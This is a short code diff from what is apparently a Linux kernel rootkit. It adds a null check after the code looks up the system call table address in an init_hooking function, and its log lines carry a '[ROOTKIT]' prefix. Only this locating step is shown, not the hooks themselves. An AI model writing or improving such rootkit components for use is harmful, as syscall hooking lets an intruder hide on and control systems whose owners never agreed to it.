@@ -55,6 +55,11 @@ int init_hooking(void)
 
     // Find syscall table address
     p_syscall_table = lookup_name(SYS_CALL_TABLE_NAME);
+    if (p_syscall_table == NULL) {
+        pr_err("[ROOTKIT] Failed to get sys_call_table address.");
+        return -ENOENT;
+    }
+
     pr_info("[ROOTKIT] Syscall table address: %p", p_syscall_table);
 
     return 0;
